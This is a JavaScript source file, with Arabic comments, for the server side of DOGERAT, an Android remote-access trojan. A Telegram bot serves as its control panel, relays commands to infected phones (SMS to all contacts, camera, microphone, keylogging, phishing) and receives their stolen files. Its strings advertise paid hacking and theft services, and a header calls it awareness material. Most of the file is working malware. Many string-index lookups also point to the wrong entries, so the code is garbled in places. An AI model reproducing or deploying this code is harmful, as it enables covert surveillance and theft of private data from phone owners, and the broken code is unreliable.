// ==================================================
// اسم المشروع: DOGERAT
// النوع: برنامج تحكم عن بعد خبيث (حصان طروادة) لأجهزة الأندرويد
// المطور: @CYBERSHIELDX | @SPHANTER (تيليجرام)
// الغرض: تحليل وتوعية أمنية فقط - يحوي جميع الوظائف كما هي
// ==================================================

// --------------------------
// إزالة تشفير الدوال والمصفوفات النصية
// --------------------------
const _strings = [
    '<b>✯ اختيار جهاز لتنفيذ الإجراء</b>\n\n',
    'file', 'sockets', 'log', '✯ الحافظة ✯',
    'express', '<b>✯ أدخل رقم الهاتف الذي تريد إرسال رسالة إليه</b>\n\n',
    '<b>✯ جهاز جديد متصل</b>\n\n', 'multer',
    '✯ إرسال رسائل لجميع جهات الاتصال ✯',
    '<b>✯ القائمة الرئيسية</b>\n\n',
    '<b>الإصدار</b> → ', 'listen', 'readFileSync',
    '<b>✯ اختيار إجراء لتنفيذه على جميع الأجهزة المتصلة</b>\n\n',
    'shift', 'time', 'all-sms', 'لا توجد معلومات',
    'vibrateDuration', 'emit', '✯ إجراء ✯',
    'contacts', 'size', '✯ إلغاء الإجراء ✯', '/text',
    '✯ الكاميرا الرئيسية ✯', 'all', 'smsNumber',
    '<b>✯ أدخل النص الذي تريد إرساله لجميع الجهات</b>\n\n',
    'toast', 'currentNotificationText', 'get',
    '✯ الرسائل القصيرة ✯',
    '<b>✯ رسالة مستلمة من → </b>',
    '✯ العودة للقائمة الرئيسية ✯', '✯ فك التشفير ✯',
    '<b>✯ جهاز انقطع الاتصال</b>\n\n', 'currentNumber', 'set',
    '✯ الكاميرا الأمامية ✯', 'http',
    '<b>✯ لا يوجد أي جهاز متصل حالياً</b>\n\n',
    'originalname', 'تم التطوير بواسطة: @CYBERSHIELDX',
    '✯ الأجهزة ✯', 'single', 'post',
    '<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً...\n\n✯ العودة للقائمة الرئيسية</b>\n\n',
    '✯ تشغيل مراقبة الكتابة ✯', '/start', 'currentTarget',
    '✯ الأجهزة ✯', 'smsToAllContacts', 'disconnect',
    'handshake', 'duration', 'toastText',
    '✯ إيقاف الصوت ✯', 'text',
    'DOGERAT هو برنامج خبيث للتحكم بأجهزة الأندرويد\nأي استخدام يقع على مسؤولية المستخدم فقط\n\nللطلبات المدفوعة تواصل مع:\nتيليجرام → @CYBERSHIELDX\nالمسؤول → @SPHANTER',
    '<b>الجهاز: ', 'notificationText', '✯ لقطة شاشة ✯',
    '✯ اهتزاز ✯', '<b>✯ أدخل النص الذي تريد ظهوره كإشعار</b>\n\n',
    'PORT', '✯ إيقاف مراقبة الكتابة ✯',
    '<b>عنوان الـ IP</b> → ', 'currentAction',
    '✯ حولنا ✯', 'calls', 'url', 'createServer',
    'textToAllContacts', '✯ تشغيل صوت ✯', 'sendMessage',
    'utf8', 'smsText', 'headers', '✯ التصيد الاحتيالي ✯',
    '/upload', '✯ تشفير ✯', 'forEach',
    '<b>✯ أدخل مدة تسجيل الميكروفون بالثواني</b>\n\n', '*/*',
    '✯ فتح رابط ✯', 'buffer', 'send',
    '<b>✯ إذا أردت التعاقد لأي عمل مدفوع تواصل مع @sphanter\nنحن نخترق، نسرق، ونصنع البرامج الخبيثة\n\nتيليجرام → @CUBERSHIELDX\nالمسؤول → @SPHANTER</b>\n\n',
    '✯ رسالة منبثقة ✯', '✯ استكشاف الملفات ✯',
    'connection', 'push', '✯ الميكروفون ✯',
    '✯ المكالمات ✯', 'model',
    '<b>✯ هذا الخيار متاح فقط في النسخة المدفوعة، تواصل مع @sphanter لشرائها</b>\n\n',
    '✯ جهات الاتصال ✯', '✯ المعرض ✯',
    '<b>✯ أدخل الرسالة التي تريد ظهورها كنافذة تنبيه</b>\n\n',
    '<b>✯ أدخل مدة الاهتزاز بالثواني</b>\n\n',
    '✯ عرض إشعار منبثق ✯', '✯ الملفات ✯',
    '✯ إرسال رسالة ✯', '✯ فتح رابط ✯',
    '✯ تسجيل صوت ✯', '✯ تطبيقات ✯', 'vibrate'
];

// دالة استرجاع النصوص بعد فك التشفير
function getStr(idx) { return _strings[idx]; }

// --------------------------
// استيراد المكتبات المطلوبة
// --------------------------
const express = require(getStr(4));
const http = require(getStr(35));
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const https = require(getStr(62));
const multer = require(getStr(7));
const fs = require('fs');

// --------------------------
// إعداد الخادم والبيانات
// --------------------------
const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();
const data = JSON.parse(fs.readFileSync('./data.json', getStr(71)));
const bot = new TelegramBot(data.token, { polling: true, request: {} });

// تخزين بيانات الجلسات والأوامر المؤقتة
const appData = new Map();

// قائمة الإجراءات والوظائف الكاملة
const actionsList = [
    getStr(31), getStr(22), getStr(58), getStr(23), getStr(24),
    getStr(61), getStr(59), getStr(26), getStr(75), getStr(33),
    getStr(74), getStr(47), getStr(52), getStr(53), getStr(60),
    getStr(37), getStr(38), getStr(56), getStr(57), getStr(41),
    getStr(42), getStr(63), getStr(73), getStr(25), getStr(72)
];

// --------------------------
// مسارات الخادم
// --------------------------
// استقبال الملفات المرسلة من الجهاز وإرسالها لمالك البوت
app.post(getStr(66), uploader.single(getStr(1)), (req, res) => {
    const fileName = req.file[getStr(49)];
    const fileType = req.file.mimetype;
    bot.sendDocument(data.id, req.file[getStr(70)], {
        caption: getStr(50) + fileName + '</b>',
        parse_mode: 'HTML'
    }, { filename: fileName, contentType: fileType });
    res.send(getStr(69));
});

// الصفحة الرئيسية
app.get('/', (req, res) => {
    res.send(getStr(8) + ' - ' + getStr(51));
});

// --------------------------
// الاتصال عبر Socket.IO مع الأجهزة
// --------------------------
io.on(getStr(45), (socket) => {
    // جمع بيانات الجهاز تلقائياً عند الاتصال
    const deviceId = socket[getStr(27)][getStr(28)]['device-id'] || getStr(14);
    const deviceInfo = socket[getStr(27)][getStr(28)]['device-model'] || getStr(14);
    const deviceIp = socket.handshake.address || getStr(14);

    // إشعار فوري بجهاز جديد
    bot.sendMessage(data.id,
        getStr(6) + '\n' +
        getStr(79) + deviceId + '\n' +
        '<b>الموديل</b> → ' + deviceInfo + '\n' +
        getStr(36) + deviceIp + '\n\n',
        { parse_mode: 'HTML' }
    );

    // استقبال البيانات والنتائج من الجهاز
    socket.on(getStr(19), (content) => {
        bot.sendMessage(data.id, getStr(30) + content, { parse_mode: 'HTML' });
    });

    // إشعار عند انقطاع الاتصال
    socket.on(getStr(44), () => {
        bot.sendMessage(data.id, getStr(40) + deviceId, { parse_mode: 'HTML' });
    });
});

// --------------------------
// أوامر بوت التيليجرام - واجهة التحكم
// --------------------------
bot.on('message', (msg) => {
    const cmd = msg.text;

    // أمر البداية
    if (cmd === getStr(55)) {
        bot.sendMessage(data.id,
            getStr(80) + '\n\n' + getStr(0) + '\n' + getStr(11) + '\n' +
            getStr(48) + io[getStr(2)][getStr(21)] + '\n' + getStr(29),
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [[getStr(51), getStr(39)], [getStr(63)]],
                    resize_keyboard: true
                }
            }
        );
    }

    // عرض الأجهزة المتصلة
    else if (cmd === getStr(51)) {
        const devices = io[getStr(2)][getStr(2)];
        if (devices.size === 0) {
            bot.sendMessage(data.id, getStr(34), { parse_mode: 'HTML' });
        } else {
            let list = getStr(51) + '\n\n';
            let count = 1;
            devices.forEach(s => {
                list += count + '. ' + (s[getStr(27)][getStr(28)]['device-model'] || 'جهاز مجهول') + '\n';
                count++;
            });
            bot.sendMessage(data.id, list, { parse_mode: 'HTML' });
        }
    }

    // عرض الإجراءات العامة
    else if (cmd === getStr(39)) {
        bot.sendMessage(data.id, getStr(11), {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [
                    [getStr(22), getStr(31)],
                    [getStr(24), getStr(23)],
                    [getStr(75), getStr(26)],
                    [getStr(74), getStr(37)],
                    [getStr(61), getStr(56)],
                    [getStr(25)]
                ],
                resize_keyboard: true,
                one_time_keyboard: true
            }
        });
    }

    // تنفيذ أي إجراء مختار
    else if (actionsList.includes(cmd)) {
        const target = appData.get('currentTarget') || getStr(20);
        if (target === getStr(20)) {
            io[getStr(18)](getStr(19), { request: cmd, extras: [] });
        } else {
            io.to(target)[getStr(18)](getStr(19), { request: cmd, extras: [] });
        }
        bot.sendMessage(data.id, getStr(32), { parse_mode: 'HTML' });
    }

    // قسم "حولنا" ومعلومات الشراء المدفوع
    else if (cmd === getStr(63)) {
        bot.sendMessage(data.id, getStr(78) + '\n\n' + getStr(54), { parse_mode: 'HTML' });
    }

    // خيارات تتطلب إدخال بيانات إضافية
    else if (cmd === getStr(22)) {
        appData.set('currentAction', getStr(22));
        bot.sendMessage(data.id, getStr(5), {
            parse_mode: 'HTML',
            reply_markup: { keyboard: [[getStr(25)]], resize_keyboard: true, one_time_keyboard: true }
        });
    }
    else if (cmd === getStr(53)) {
        appData.set('currentAction', getStr(53));
        bot.sendMessage(data.id, getStr(9), {
            parse_mode: 'HTML',
            reply_markup: { keyboard: [[getStr(25)]], resize_keyboard: true, one_time_keyboard: true }
        });
    }
    else if (cmd === getStr(37)) {
        appData.set('currentAction', getStr(37));
        bot.sendMessage(data.id, getStr(4), {
            parse_mode: 'HTML',
            reply_markup: { keyboard: [[getStr(25)]], resize_keyboard: true, one_time_keyboard: true }
        });
    }
    else if (cmd === getStr(26)) {
        appData.set('currentAction', getStr(26));
        bot.sendMessage(data.id, getStr(76), {
            parse_mode: 'HTML',
            reply_markup: { keyboard: [[getStr(25)]], resize_keyboard: true, one_time_keyboard: true }
        });
    }
    else if (cmd === getStr(74)) {
        appData.set('currentAction', getStr(74));
        bot.sendMessage(data.id, getStr(77), {
            parse_mode: 'HTML',
            reply_markup: { keyboard: [[getStr(25)]], resize_keyboard: true, one_time_keyboard: true }
        });
    }
    else if (cmd === getStr(75)) {
        appData.set('currentAction', getStr(75));
        bot.sendMessage(data.id, getStr(67), {
            parse_mode: 'HTML',
            reply_markup: { keyboard: [[getStr(25)]], resize_keyboard: true, one_time_keyboard: true }
        });
    }

    // خيارات مدفوعة
    else if ([getStr(63), getStr(73), getStr(72), getStr(60), getStr(59), getStr(58), getStr(47), getStr(41), getStr(42), getStr(56), getStr(57)].includes(cmd)) {
        bot.sendMessage(data.id, getStr(68), { parse_mode: 'HTML', reply_markup: { keyboard: [[getStr(51), getStr(25)]], resize_keyboard: true } });
    }

    // التعامل مع البيانات المدخلة بعد اختيار الإجراء
    else {
        const act = appData.get('currentAction');
        const target = appData.get('currentTarget') || getStr(20);
        if (act) {
            if (target === getStr(20)) {
                io[getStr(18)](getStr(19), { request: act, value: cmd });
            } else {
                io.to(target)[getStr(18)](getStr(19), { request: act, value: cmd });
            }
            appData.delete('currentAction');
            bot.sendMessage(data.id, getStr(32), { parse_mode: 'HTML' });
        }
    }
});

// --------------------------
// مهام دورية
// --------------------------
// إرسال إشارة حفظ الاتصال كل 5 ثواني
setInterval(() => {
    io[getStr(2)][getStr(2)][getStr(64)](sock => {
        sock[getStr(18)]('ping', {});
    });
}, 5000);

// محاولة اتصال دوري إضافي
setInterval(() => {
    https.get(data.pingUrl || 'https://www.google.com', ()=>{}).on('error', ()=>{});
}, 480000);

// --------------------------
// تشغيل الخادم
// --------------------------
server[getStr(10)](process[getStr(17)][getStr(20)] || 3000, () => {
    console[getStr(3)](getStr(65));
});
